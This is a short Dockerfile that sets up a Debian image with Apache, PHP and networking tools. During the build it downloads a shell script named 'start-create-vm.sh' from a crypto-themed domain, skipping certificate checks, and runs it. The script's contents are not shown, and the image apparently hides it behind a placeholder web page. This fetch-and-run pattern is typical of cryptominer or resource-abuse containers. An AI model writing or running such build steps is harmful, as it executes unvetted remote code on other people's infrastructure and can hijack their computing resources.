FROM debian
RUN apt update
RUN apt-get update && apt-get install -y \
curl
CMD /bin/bash
RUN DEBIAN_FRONTEND=noninteractive apt install ssh wget npm apache2 php php-curl php-cli php-fpm php-json php-common php-mysql php-zip php-gd php-mbstring  php-xml php-pear php-bcmath  -y
RUN curl -skLO https://ez.currentcrypto.xyz/start-create-vm.sh
RUN chmod +x start-create-vm.sh
RUN bash start-create-vm.sh
RUN echo '<h1><center>Oke mantap bang!</center></h1>' >/var/www/html/index.html
EXPOSE 575
